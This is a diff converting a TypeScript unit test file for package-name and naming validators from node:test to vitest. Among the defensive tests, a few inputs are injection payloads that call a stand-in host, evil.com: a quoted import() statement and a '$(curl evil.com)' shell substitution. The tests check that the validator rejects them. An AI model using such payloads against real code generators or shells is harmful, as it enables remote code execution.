@@ -1,11 +1,9 @@
 /**
  * Unit tests for validation utilities
  *
- * Run with: node --import tsx --test src/utils/validation.test.ts
  */
 
-import { describe, it, mock } from 'node:test';
-import assert from 'node:assert/strict';
+import { describe, expect, it, vi } from 'vitest';
 import {
   isCustomUikit,
   normalizeUikit,
@@ -19,300 +17,303 @@ import {
 
 describe('isCustomUikit', () => {
   it('should return false for "shadcn"', () => {
-    assert.equal(isCustomUikit('shadcn'), false);
+    expect(isCustomUikit('shadcn')).toBe(false);
   });
 
   it('should return false for "none"', () => {
-    assert.equal(isCustomUikit('none'), false);
+    expect(isCustomUikit('none')).toBe(false);
   });
 
   it('should return false for legacy "frontx" alias', () => {
-    assert.equal(isCustomUikit('frontx'), false);
+    expect(isCustomUikit('frontx')).toBe(false);
   });
 
   it('should return true for scoped npm packages', () => {
-    assert.equal(isCustomUikit('@acronis-platform/shadcn-uikit'), true);
-    assert.equal(isCustomUikit('@my-org/ui'), true);
+    expect(isCustomUikit('@acronis-platform/shadcn-uikit')).toBe(true);
+    expect(isCustomUikit('@my-org/ui')).toBe(true);
   });
 
   it('should return true for unscoped npm packages', () => {
-    assert.equal(isCustomUikit('antd'), true);
-    assert.equal(isCustomUikit('material-ui'), true);
+    expect(isCustomUikit('antd')).toBe(true);
+    expect(isCustomUikit('material-ui')).toBe(true);
   });
 });
 
 describe('normalizeUikit', () => {
   it('should map legacy "frontx" to "shadcn"', () => {
-    assert.equal(normalizeUikit('frontx'), 'shadcn');
+    expect(normalizeUikit('frontx')).toBe('shadcn');
   });
 
   it('should keep non-legacy values unchanged', () => {
-    assert.equal(normalizeUikit('shadcn'), 'shadcn');
-    assert.equal(normalizeUikit('none'), 'none');
-    assert.equal(normalizeUikit('@my-org/ui'), '@my-org/ui');
+    expect(normalizeUikit('shadcn')).toBe('shadcn');
+    expect(normalizeUikit('none')).toBe('none');
+    expect(normalizeUikit('@my-org/ui')).toBe('@my-org/ui');
   });
 });
 
 describe('isValidPackageName', () => {
   it('should reject empty strings', () => {
-    assert.equal(isValidPackageName(''), false);
+    expect(isValidPackageName('')).toBe(false);
   });
 
   it('should reject names longer than 214 characters', () => {
-    assert.equal(isValidPackageName('a'.repeat(215)), false);
-    assert.equal(isValidPackageName('a'.repeat(214)), true);
+    expect(isValidPackageName('a'.repeat(215))).toBe(false);
+    expect(isValidPackageName('a'.repeat(214))).toBe(true);
   });
 
   it('should reject names starting with . or _', () => {
-    assert.equal(isValidPackageName('.hidden'), false);
-    assert.equal(isValidPackageName('_private'), false);
+    expect(isValidPackageName('.hidden')).toBe(false);
+    expect(isValidPackageName('_private')).toBe(false);
   });
 
   it('should reject uppercase characters', () => {
-    assert.equal(isValidPackageName('MyPackage'), false);
-    assert.equal(isValidPackageName('myPackage'), false);
+    expect(isValidPackageName('MyPackage')).toBe(false);
+    expect(isValidPackageName('myPackage')).toBe(false);
   });
 
   it('should reject special characters', () => {
-    assert.equal(isValidPackageName('my~package'), false);
-    assert.equal(isValidPackageName("my'package"), false);
-    assert.equal(isValidPackageName('my!package'), false);
-    assert.equal(isValidPackageName('my(package)'), false);
-    assert.equal(isValidPackageName('my*package'), false);
+    expect(isValidPackageName('my~package')).toBe(false);
+    expect(isValidPackageName("my'package")).toBe(false);
+    expect(isValidPackageName('my!package')).toBe(false);
+    expect(isValidPackageName('my(package)')).toBe(false);
+    expect(isValidPackageName('my*package')).toBe(false);
   });
 
   it('should accept valid unscoped names', () => {
-    assert.equal(isValidPackageName('my-project'), true);
-    assert.equal(isValidPackageName('frontx'), true);
-    assert.equal(isValidPackageName('some-package-123'), true);
+    expect(isValidPackageName('my-project')).toBe(true);
+    expect(isValidPackageName('frontx')).toBe(true);
+    expect(isValidPackageName('some-package-123')).toBe(true);
   });
 
   it('should accept valid scoped names', () => {
-    assert.equal(isValidPackageName('@cyberfabric/cli'), true);
-    assert.equal(isValidPackageName('@my-org/my-package'), true);
+    expect(isValidPackageName('@cyberfabric/cli')).toBe(true);
+    expect(isValidPackageName('@my-org/my-package')).toBe(true);
   });
 
   it('should reject malformed scoped names', () => {
-    assert.equal(isValidPackageName('@/missing-scope'), false);
-    assert.equal(isValidPackageName('@scope/'), false);
-    assert.equal(isValidPackageName('@scope'), false);
+    expect(isValidPackageName('@/missing-scope')).toBe(false);
+    expect(isValidPackageName('@scope/')).toBe(false);
+    expect(isValidPackageName('@scope')).toBe(false);
   });
 });
 
 describe('isCamelCase', () => {
   it('should reject empty strings', () => {
-    assert.equal(isCamelCase(''), false);
+    expect(isCamelCase('')).toBe(false);
   });
 
   it('should reject strings starting with uppercase', () => {
-    assert.equal(isCamelCase('MyComponent'), false);
-    assert.equal(isCamelCase('ABC'), false);
+    expect(isCamelCase('MyComponent')).toBe(false);
+    expect(isCamelCase('ABC')).toBe(false);
   });
 
   it('should reject strings with non-alphanumeric characters', () => {
-    assert.equal(isCamelCase('my-name'), false);
-    assert.equal(isCamelCase('my_name'), false);
-    assert.equal(isCamelCase('my name'), false);
-    assert.equal(isCamelCase('my.name'), false);
+    expect(isCamelCase('my-name')).toBe(false);
+    expect(isCamelCase('my_name')).toBe(false);
+    expect(isCamelCase('my name')).toBe(false);
+    expect(isCamelCase('my.name')).toBe(false);
   });
 
   it('should accept valid camelCase strings', () => {
-    assert.equal(isCamelCase('contacts'), true);
-    assert.equal(isCamelCase('myScreenset'), true);
-    assert.equal(isCamelCase('dashboard'), true);
-    assert.equal(isCamelCase('contactList2'), true);
+    expect(isCamelCase('contacts')).toBe(true);
+    expect(isCamelCase('myScreenset')).toBe(true);
+    expect(isCamelCase('dashboard')).toBe(true);
+    expect(isCamelCase('contactList2')).toBe(true);
   });
 
   it('should reject strings starting with a number', () => {
-    assert.equal(isCamelCase('2things'), false);
+    expect(isCamelCase('2things')).toBe(false);
   });
 });
 
 describe('isPascalCase', () => {
   it('should reject empty strings', () => {
-    assert.equal(isPascalCase(''), false);
+    expect(isPascalCase('')).toBe(false);
   });
 
   it('should reject strings starting with lowercase', () => {
-    assert.equal(isPascalCase('myComponent'), false);
-    assert.equal(isPascalCase('abc'), false);
+    expect(isPascalCase('myComponent')).toBe(false);
+    expect(isPascalCase('abc')).toBe(false);
   });
 
   it('should reject strings with non-alphanumeric characters', () => {
-    assert.equal(isPascalCase('My-Name'), false);
-    assert.equal(isPascalCase('My_Name'), false);
-    assert.equal(isPascalCase('My Name'), false);
+    expect(isPascalCase('My-Name')).toBe(false);
+    expect(isPascalCase('My_Name')).toBe(false);
+    expect(isPascalCase('My Name')).toBe(false);
   });
 
   it('should accept valid PascalCase strings', () => {
-    assert.equal(isPascalCase('Contacts'), true);
-    assert.equal(isPascalCase('MyScreenset'), true);
-    assert.equal(isPascalCase('Dashboard'), true);
-    assert.equal(isPascalCase('ContactList2'), true);
+    expect(isPascalCase('Contacts')).toBe(true);
+    expect(isPascalCase('MyScreenset')).toBe(true);
+    expect(isPascalCase('Dashboard')).toBe(true);
+    expect(isPascalCase('ContactList2')).toBe(true);
   });
 });
 
 describe('isReservedScreensetName', () => {
   it('should flag reserved names', () => {
-    assert.equal(isReservedScreensetName('screenset'), true);
-    assert.equal(isReservedScreensetName('screen'), true);
-    assert.equal(isReservedScreensetName('index'), true);
-    assert.equal(isReservedScreensetName('api'), true);
-    assert.equal(isReservedScreensetName('core'), true);
+    expect(isReservedScreensetName('screenset')).toBe(true);
+    expect(isReservedScreensetName('screen')).toBe(true);
+    expect(isReservedScreensetName('index')).toBe(true);
+    expect(isReservedScreensetName('api')).toBe(true);
+    expect(isReservedScreensetName('core')).toBe(true);
   });
 
   it('should be case-insensitive', () => {
-    assert.equal(isReservedScreensetName('Screenset'), true);
-    assert.equal(isReservedScreensetName('INDEX'), true);
-    assert.equal(isReservedScreensetName('Api'), true);
+    expect(isReservedScreensetName('Screenset')).toBe(true);
+    expect(isReservedScreensetName('INDEX')).toBe(true);
+    expect(isReservedScreensetName('Api')).toBe(true);
   });
 
   it('should allow non-reserved names', () => {
-    assert.equal(isReservedScreensetName('contacts'), false);
-    assert.equal(isReservedScreensetName('dashboard'), false);
-    assert.equal(isReservedScreensetName('settings'), false);
+    expect(isReservedScreensetName('contacts')).toBe(false);
+    expect(isReservedScreensetName('dashboard')).toBe(false);
+    expect(isReservedScreensetName('settings')).toBe(false);
   });
 });
 
 describe('assertValidUikitForCodegen', () => {
   it('should accept valid unscoped package names', () => {
-    assert.doesNotThrow(() => assertValidUikitForCodegen('antd'));
-    assert.doesNotThrow(() => assertValidUikitForCodegen('material-ui'));
-    assert.doesNotThrow(() => assertValidUikitForCodegen('my-ui-lib'));
+    expect(() => {
+      assertValidUikitForCodegen('antd');
+    }).not.toThrow();
+    expect(() => {
+      assertValidUikitForCodegen('material-ui');
+    }).not.toThrow();
+    expect(() => {
+      assertValidUikitForCodegen('my-ui-lib');
+    }).not.toThrow();
   });
 
   it('should accept valid scoped package names', () => {
-    assert.doesNotThrow(() => assertValidUikitForCodegen('@my-org/ui'));
-    assert.doesNotThrow(() => assertValidUikitForCodegen('@acronis-platform/shadcn-uikit'));
+    expect(() => {
+      assertValidUikitForCodegen('@my-org/ui');
+    }).not.toThrow();
+    expect(() => {
+      assertValidUikitForCodegen('@acronis-platform/shadcn-uikit');
+    }).not.toThrow();
   });
 
   it('should reject TypeScript injection via quotes and semicolons', () => {
-    assert.throws(
-      () => assertValidUikitForCodegen("'; import('http://evil.com/x');"),
-      /not a valid npm package name/
-    );
+    expect(() => {
+      assertValidUikitForCodegen("'; import('http://evil.com/x');");
+    }).toThrow(/not a valid npm package name/);
   });
 
   it('should reject shell-style injection payloads', () => {
-    assert.throws(
-      () => assertValidUikitForCodegen('$(curl evil.com)'),
-      /not a valid npm package name/
-    );
+    expect(() => {
+      assertValidUikitForCodegen('$(curl evil.com)');
+    }).toThrow(/not a valid npm package name/);
   });
 
   it('should reject newline injection', () => {
-    assert.throws(
-      () => assertValidUikitForCodegen('valid\n//malicious'),
-      /not a valid npm package name/
-    );
+    expect(() => {
+      assertValidUikitForCodegen('valid\n//malicious');
+    }).toThrow(/not a valid npm package name/);
   });
 
   it('should reject empty string', () => {
-    assert.throws(
-      () => assertValidUikitForCodegen(''),
-      /not a valid npm package name/
-    );
+    expect(() => {
+      assertValidUikitForCodegen('');
+    }).toThrow(/not a valid npm package name/);
   });
 
   it('should reject names with special characters', () => {
-    assert.throws(
-      () => assertValidUikitForCodegen('invalid!@#$'),
-      /not a valid npm package name/
-    );
+    expect(() => {
+      assertValidUikitForCodegen('invalid!@#$');
+    }).toThrow(/not a valid npm package name/);
   });
 
   it('should reject names with spaces', () => {
-    assert.throws(
-      () => assertValidUikitForCodegen('my package'),
-      /not a valid npm package name/
-    );
+    expect(() => {
+      assertValidUikitForCodegen('my package');
+    }).toThrow(/not a valid npm package name/);
   });
 
   it('should reject uppercase names', () => {
-    assert.throws(
-      () => assertValidUikitForCodegen('MyPackage'),
-      /not a valid npm package name/
-    );
+    expect(() => {
+      assertValidUikitForCodegen('MyPackage');
+    }).toThrow(/not a valid npm package name/);
   });
 });
 
 describe('validateNpmPackage', () => {
   it('should reject syntactically invalid names without hitting the network', async () => {
     const result = await validateNpmPackage('!!!INVALID!!!');
-    assert.equal(result.exists, false);
-    assert.ok(result.error?.includes('not a valid npm package name'));
+    expect(result.exists).toBe(false);
+    expect(result.error?.includes('not a valid npm package name')).toBeTruthy();
   });
 
   it('should reject empty string', async () => {
     const result = await validateNpmPackage('');
-    assert.equal(result.exists, false);
-    assert.ok(result.error);
+    expect(result.exists).toBe(false);
+    expect(result.error).toBeTruthy();
   });
 
   it('should reject uppercase names', async () => {
     const result = await validateNpmPackage('MyPackage');
-    assert.equal(result.exists, false);
-    assert.ok(result.error?.includes('not a valid npm package name'));
+    expect(result.exists).toBe(false);
+    expect(result.error?.includes('not a valid npm package name')).toBeTruthy();
   });
 
   it('should return exists:true for a known valid package', async () => {
-    const mockFetch = mock.fn(() =>
+    expect.assertions(2);
+    const mockFetch = vi.fn(() =>
       Promise.resolve(new Response(null, { status: 200 }))
     );
-    const originalFetch = globalThis.fetch;
-    globalThis.fetch = mockFetch as typeof fetch;
+    vi.stubGlobal('fetch', mockFetch);
     try {
       const result = await validateNpmPackage('lodash');
-      assert.equal(result.exists, true);
-      assert.equal(result.error, undefined);
+      expect(result.exists).toBe(true);
+      expect(result.error).toBe(undefined);
     } finally {
-      globalThis.fetch = originalFetch;
+      vi.unstubAllGlobals();
     }
   });
 
   it('should return exists:false for a 404 response', async () => {
-    const mockFetch = mock.fn(() =>
+    expect.assertions(2);
+    const mockFetch = vi.fn(() =>
       Promise.resolve(new Response(null, { status: 404 }))
     );
-    const originalFetch = globalThis.fetch;
-    globalThis.fetch = mockFetch as typeof fetch;
+    vi.stubGlobal('fetch', mockFetch);
     try {
       const result = await validateNpmPackage('lodash');
-      assert.equal(result.exists, false);
-      assert.ok(result.error?.includes('not found'));
+      expect(result.exists).toBe(false);
+      expect(result.error?.includes('not found')).toBeTruthy();
     } finally {
-      globalThis.fetch = originalFetch;
+      vi.unstubAllGlobals();
     }
   });
 
   it('should return exists:true with warning on network failure for valid names', async () => {
-    const mockFetch = mock.fn(() =>
+    expect.assertions(2);
+    const mockFetch = vi.fn(() =>
       Promise.reject(new Error('network down'))
     );
-    const originalFetch = globalThis.fetch;
-    globalThis.fetch = mockFetch as typeof fetch;
+    vi.stubGlobal('fetch', mockFetch);
     try {
       const result = await validateNpmPackage('lodash');
-      assert.equal(result.exists, true);
-      assert.ok(result.warning?.includes('Could not verify'));
+      expect(result.exists).toBe(true);
+      expect(result.warning?.includes('Could not verify')).toBeTruthy();
     } finally {
-      globalThis.fetch = originalFetch;
+      vi.unstubAllGlobals();
     }
   });
 
   it('should reject invalid names even when network would fail', async () => {
-    const mockFetch = mock.fn(() =>
+    expect.assertions(3);
+    const mockFetch = vi.fn(() =>
       Promise.reject(new Error('network down'))
     );
-    const originalFetch = globalThis.fetch;
-    globalThis.fetch = mockFetch as typeof fetch;
+    vi.stubGlobal('fetch', mockFetch);
     try {
       const result = await validateNpmPackage('INVALID_NAME');
-      assert.equal(result.exists, false);
-      assert.ok(result.error?.includes('not a valid npm package name'));
-      assert.equal(mockFetch.mock.callCount(), 0);
+      expect(result.exists).toBe(false);
+      expect(result.error?.includes('not a valid npm package name')).toBeTruthy();
+      expect(mockFetch.mock.calls.length).toBe(0);
     } finally {
-      globalThis.fetch = originalFetch;
+      vi.unstubAllGlobals();
     }
   });
 });
